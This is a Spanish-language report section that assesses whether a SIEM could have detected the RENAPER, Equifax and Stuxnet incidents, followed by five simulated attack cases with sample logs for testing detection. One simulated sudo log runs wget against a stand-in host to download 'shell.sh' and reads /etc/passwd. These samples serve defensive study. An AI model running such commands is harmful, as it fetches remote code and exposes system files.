## 5.1 Caso 1: RENAPER (Argentina, 2021)

### 5.1.1 Descripción técnica del ataque

El incidente de seguridad asociado al Registro Nacional de las Personas (RENAPER) se produjo a partir del uso indebido de credenciales legítimas pertenecientes a un organismo con acceso autorizado al sistema.

A través de estas credenciales, el atacante accedió al servicio de validación del Sistema de Identidad Digital (SID), el cual permite consultar información asociada a un número de documento (DNI). Este servicio devuelve datos personales sensibles, incluyendo nombre, dirección, fecha de nacimiento e imagen del ciudadano.

El acceso se realizó mediante una conexión VPN habilitada, lo que indica que el atacante no explotó una vulnerabilidad técnica en la infraestructura, sino que utilizó credenciales válidas para realizar consultas al sistema.

Durante el incidente, se realizaron múltiples solicitudes al servicio en un intervalo de tiempo reducido, lo que permitió extraer información de distintos individuos. Parte de estos datos fue posteriormente publicada en redes sociales.

### 5.1.2 Timeline del ataque

1. Obtención o acceso a credenciales válidas.
2. Establecimiento de conexión a través de VPN autorizada.
3. Acceso al servicio de validación (SID).
4. Ejecución de múltiples consultas a partir de distintos DNI.
5. Obtención de datos personales e imágenes.
6. Publicación de la información obtenida.

### 5.1.3 Eventos generados (logs)

Durante la ejecución del ataque, se generan múltiples eventos observables en distintos niveles de la infraestructura:

- Logs de autenticación (VPN / sistema)
  - Inicio de sesión con credenciales válidas
  - Registro de dirección IP de origen

- Logs de aplicación (SID)
  - Solicitudes de consulta por DNI
  - Frecuencia de requests
  - Identificación del usuario autenticado

- Logs de base de datos
  - Consultas repetitivas a registros de ciudadanos
  - Acceso a información sensible

- Logs de red
  - Tráfico hacia el servicio de validación

Estos eventos, aunque individuales, representan señales que pueden ser utilizadas para detectar comportamientos anómalos cuando se analizan en conjunto.

### 5.1.4 Análisis de detección

- Alta frecuencia de consultas en un período corto
- Acceso repetitivo a información sensible
- Uso intensivo de un servicio por un mismo usuario
- Posible desviación respecto al comportamiento normal del sistema

Si bien cada evento individual puede ser considerado válido, la secuencia completa evidencia un patrón de uso anómalo.

### 5.1.5 Detección mediante SIEM

- Correlación entre autenticación y volumen de consultas
- Identificación de umbrales de requests por usuario
- Detección de accesos repetitivos a datos sensibles
- Análisis de comportamiento por ventana de tiempo

A través de reglas de detección, sería posible generar alertas ante patrones de uso que excedan los valores normales del sistema.

### 5.1.6 Evaluación del caso

El incidente presenta múltiples eventos observables y correlacionables dentro de logs de autenticación, aplicación y base de datos.

La implementación de un sistema SIEM podría haber permitido detectar el comportamiento anómalo en etapas tempranas, reduciendo el volumen de información expuesta.

Por lo tanto, este caso se considera potencialmente mitigable mediante mecanismos de monitoreo y correlación de eventos.

---

## 5.2 Caso 2: Equifax (Estados Unidos, 2017)

### 5.2.1 Descripción técnica del ataque

El incidente de seguridad de Equifax se originó a partir de la explotación de una vulnerabilidad conocida en el framework Apache Struts (CVE-2017-5638), presente en una aplicación web expuesta a internet.

A través de esta vulnerabilidad, los atacantes lograron ejecutar código de forma remota en el servidor comprometido. A partir de este acceso inicial, desplegaron mecanismos de persistencia, como web shells.

Posteriormente, los atacantes obtuvieron credenciales internas y realizaron movimientos laterales dentro de la infraestructura, accediendo a múltiples sistemas y bases de datos. Durante este proceso, realizaron consultas a datos sensibles de forma sostenida.

El ataque se mantuvo activo durante aproximadamente 76 días, permitiendo la exfiltración de información personal de aproximadamente 147 millones de personas.

### 5.2.2 Timeline del ataque

1. Explotación de vulnerabilidad en aplicación web (Apache Struts).
2. Ejecución remota de comandos en el servidor.
3. Instalación de mecanismos de persistencia (web shell).
4. Obtención de credenciales internas.
5. Movimiento lateral hacia otros sistemas.
6. Acceso a bases de datos sensibles.
7. Extracción de información durante un período prolongado.

### 5.2.3 Eventos generados (logs)

- Logs de aplicación web
  - Requests maliciosos hacia endpoints vulnerables
  - Patrones asociados a explotación

- Logs de sistema
  - Ejecución de comandos en el servidor
  - Creación o modificación de archivos

- Logs de autenticación
  - Uso de credenciales internas
  - Accesos a sistemas desde hosts comprometidos

- Logs de red
  - Conexiones entre sistemas internos
  - Tráfico de salida asociado a exfiltración

- Logs de base de datos
  - Consultas a gran volumen de registros
  - Acceso a información sensible

Estos eventos permiten reconstruir el comportamiento del atacante a lo largo del tiempo.

### 5.2.4 Análisis de detección

- Explotación inicial mediante patrones anómalos en requests web
- Ejecución de comandos en servidores expuestos
- Actividad inusual de autenticación
- Movimiento lateral entre sistemas
- Consultas masivas a bases de datos

Se caracteriza por su persistencia, generando una gran cantidad de eventos correlacionables.

### 5.2.5 Detección mediante SIEM

- Identificación de patrones de explotación en logs de aplicación
- Correlación entre ejecución de comandos y cambios en el sistema
- Detección de accesos internos anómalos
- Identificación de movimiento lateral
- Detección de consultas masivas o accesos inusuales

La persistencia del ataque incrementa la probabilidad de detección.

### 5.2.6 Evaluación del caso

El incidente presenta múltiples eventos detectables en diferentes capas: aplicación, sistema, red y base de datos.

La duración del ataque y la cantidad de eventos aumentan la posibilidad de detección mediante SIEM.

Se considera potencialmente mitigable mediante monitoreo y correlación de eventos.

---

## 5.3 Caso 3: Stuxnet (2010)

### 5.3.1 Descripción técnica del ataque

Stuxnet fue un malware altamente sofisticado diseñado para atacar sistemas industriales, específicamente infraestructuras de control utilizadas en el programa nuclear iraní.

Se propagaba mediante dispositivos USB y redes internas, aprovechando vulnerabilidades en sistemas Windows. Permanecía inactivo hasta detectar entornos con software Siemens STEP7.

Una vez identificado el entorno, modificaba la lógica de los controladores PLC, alterando el funcionamiento de centrifugadoras. Esto generaba desgaste y fallas progresivas.

Paralelamente, interceptaba señales de monitoreo, mostrando valores normales a los operadores, lo que permitía ocultar el ataque.

### 5.3.2 Timeline del ataque

1. Propagación mediante USB o redes internas.
2. Infección de sistemas Windows.
3. Búsqueda de entornos con STEP7.
4. Interacción con controladores PLC.
5. Modificación de la lógica de control.
6. Alteración del funcionamiento físico.
7. Ocultamiento mediante manipulación de datos.

### 5.3.3 Eventos generados (logs)

- Logs de sistema (Windows)
  - Ejecución de código malicioso
  - Modificación de archivos y procesos

- Eventos de red interna
  - Comunicación entre sistemas comprometidos
  - Propagación lateral

- Eventos en sistemas industriales (PLC/SCADA)
  - Cambios en la lógica de control
  - Alteración de parámetros operativos

Muchos de estos eventos no son accesibles desde sistemas tradicionales de logs IT.

### 5.3.4 Análisis de detección

- Uso de múltiples vulnerabilidades
- Ejecución en redes internas aisladas
- Interacción con sistemas industriales
- Manipulación de datos de monitoreo

No se observan patrones claros en logs tradicionales para detección temprana.

### 5.3.5 Detección mediante SIEM

Un SIEM tradicional presenta limitaciones:

- Baja visibilidad sobre sistemas industriales
- Manipulación de datos dificulta alertas confiables
- Activación selectiva reduce eventos detectables

Esto limita la capacidad de correlación.

### 5.3.6 Evaluación del caso

El ataque se diferencia por su enfoque en sistemas industriales y su capacidad de ocultamiento.

La baja visibilidad y la falta de logs convencionales dificultan su detección.

Por lo tanto, se considera no prevenible directamente mediante un SIEM tradicional.

---

# Casos de Estudio - SIEM (Simulación)

Esta sección contiene casos de ataques simulados para pruebas del sistema.

---

## Caso Simulado 1: Ataque de Fuerza Bruta SSH

**Fecha:** 2024-03-15 14:32:00  
**Severidad:** High  
**IP Atacante:** 192.168.1.105  
**Usuario Objetivo:** admin  
**Descripción:** Múltiples intentos de login SSH fallidos detectados desde IP externa.

### Logs Asociados

```
Mar 15 14:30:01 server1 sshd[12345]: Failed password for invalid user admin from 192.168.1.105 port 45231 ssh2
Mar 15 14:30:03 server1 sshd[12347]: Failed password for invalid user admin from 192.168.1.105 port 45232 ssh2
Mar 15 14:30:05 server1 sshd[12349]: Failed password for invalid user admin from 192.168.1.105 port 45233 ssh2
Mar 15 14:30:07 server1 sshd[12351]: Failed password for invalid user admin from 192.168.1.105 port 45234 ssh2
Mar 15 14:30:09 server1 sshd[12353]: Failed password for invalid user admin from 192.168.1.105 port 45235 ssh2
Mar 15 14:30:11 server1 sshd[12355]: Failed password for invalid user admin from 192.168.1.105 port 45236 ssh2
```

---

## Caso Simulado 2: Intento de Acceso Root

**Fecha:** 2024-03-18 09:15:00  
**Severidad:** Critical  
**IP Atacante:** 10.0.0.50  
**Usuario Objetivo:** root  
**Descripción:** Intento directo de acceso como usuario root detectado.

### Logs Asociados

```
Mar 18 09:14:55 server1 sshd[23456]: Failed password for root from 10.0.0.50 port 48291 ssh2
Mar 18 09:15:01 server1 sshd[23458]: Failed password for root from 10.0.0.50 port 48292 ssh2
```

---

## Caso Simulado 3: Escaneo de Puertos

**Fecha:** 2024-03-20 16:45:00  
**Severidad:** Medium  
**IP Atacante:** 172.16.0.100  
**Descripción:** Detección de escaneo de puertos múltiples en firewall.

### Logs Asociados

```
Mar 20 16:44:00 firewall iptables DROP: IN=eth0 OUT= SRC=172.16.0.100 DST=192.168.1.1 PROTO=TCP DPT=22 SYN
Mar 20 16:44:02 firewall iptables DROP: IN=eth0 OUT= SRC=172.16.0.100 DST=192.168.1.1 PROTO=TCP DPT=80 SYN
Mar 20 16:44:04 firewall iptables DROP: IN=eth0 OUT= SRC=172.16.0.100 DST=192.168.1.1 PROTO=TCP DPT=443 SYN
Mar 20 16:44:06 firewall iptables DROP: IN=eth0 OUT= SRC=172.16.0.100 DST=192.168.1.1 PROTO=TCP DPT=3306 SYN
Mar 20 16:44:08 firewall iptables DROP: IN=eth0 OUT= SRC=172.16.0.100 DST=192.168.1.1 PROTO=TCP DPT=5432 SYN
```

---

## Caso Simulado 4: Abuso de sudo

**Fecha:** 2024-03-22 11:20:00  
**Severidad:** Medium  
**IP Atacante:** 192.168.1.50  
**Usuario:** www-data  
**Descripción:** Ejecución excesiva de comandos con privilegios sudo.

### Logs Asociados

```
Mar 22 11:15:00 server1 sudo: www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/cat /etc/passwd
Mar 22 11:16:00 server1 sudo: www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/ls /root
Mar 22 11:17:00 server1 sudo: www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/wget http://malicious.com/shell.sh
```

---

## Caso Simulado 5: Escaneo de Directorios Web

**Fecha:** 2024-03-25 08:30:00  
**Severidad:** Medium  
**IP Atacante:** 203.0.113.25  
**Descripción:** Acceso a rutas sensibles de aplicaciones web.

### Logs Asociados

```
Mar 25 08:29:00 webserver nginx: 203.0.113.25 - - [25/Mar/2024:08:29:00] "GET /admin HTTP/1.1" 404
Mar 25 08:29:02 webserver nginx: 203.0.113.25 - - [25/Mar/2024:08:29:02] "GET /phpmyadmin HTTP/1.1" 404
Mar 25 08:29:04 webserver nginx: 203.0.113.25 - - [25/Mar/2024:08:29:04] "GET /.env HTTP/1.1" 404
Mar 25 08:29:06 webserver nginx: 203.0.113.25 - - [25/Mar/2024:08:29:06] "GET /wp-admin HTTP/1.1" 404
```

---

**Fin del documento**
